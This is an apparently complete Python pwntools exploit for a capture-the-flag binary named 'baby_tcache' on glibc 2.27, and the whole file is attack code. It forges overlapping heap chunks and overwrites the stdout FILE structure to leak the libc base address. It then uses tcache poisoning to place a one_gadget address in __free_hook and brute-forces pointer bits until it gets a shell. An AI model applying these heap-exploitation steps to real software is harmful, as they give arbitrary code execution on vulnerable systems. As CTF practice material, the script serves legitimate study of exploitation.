from pwn import *

def menu(opt):
    p.sendlineafter("Your choice: ",str(opt))

def create(size,data):
    menu(1)
    p.sendlineafter("Size:",str(size))
    p.sendafter("Data:",data)

def delete(idx):
    menu(2)
    p.sendlineafter("Index:",str(idx))

def exp():
    create(0x500,'A'*0x500)  #0
    create(0x70,'A'*0x70)    #1
    create(0x5f0,'A'*0x500)  #2
    create(0x20,'A')         #3
    
    delete(0)
    delete(1)
    create(0x78,'A'*0x70+p64(0x590))

    delete(2)                #unlink
    delete(0)                #delete it and ready for cover the fd
    create(0x500,'A'*0x500)
    create(0x80,'\x60\xb7')  #cover the fd

    create(0x70,'A')
    create(0x78,p64(0xfbad1800)+p64(0x0)*3+'\x90') #change the _flag
    #gdb.attach(p)

    data = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = data - 4114403
    one_gadget = libc_base + 0x4f322 #0x4f2c5 0x4f322 0x10a38c
    free_hook = libc_base + libc.symbols['__free_hook']
    log.success('libc base :'+hex(libc_base))
    #gdb.attach(p)

    delete(1)
    delete(2)
    create(0x80,p64(free_hook))
    create(0x80,p64(free_hook))
    create(0x80,p64(one_gadget))

    delete(0)
    #gdb.attach(p)

if __name__ == '__main__' :
    a = 16
    while(a) :
        try :
            p = process('./baby_tcache')
            elf = ELF('./baby_tcache')
            libc = ELF('./libc-2.27.so')
            context.log_level = 'debug'
            exp()
            a -= 1
        except Exception as e :
            print e
        else :
            p.interactive()
            exit()
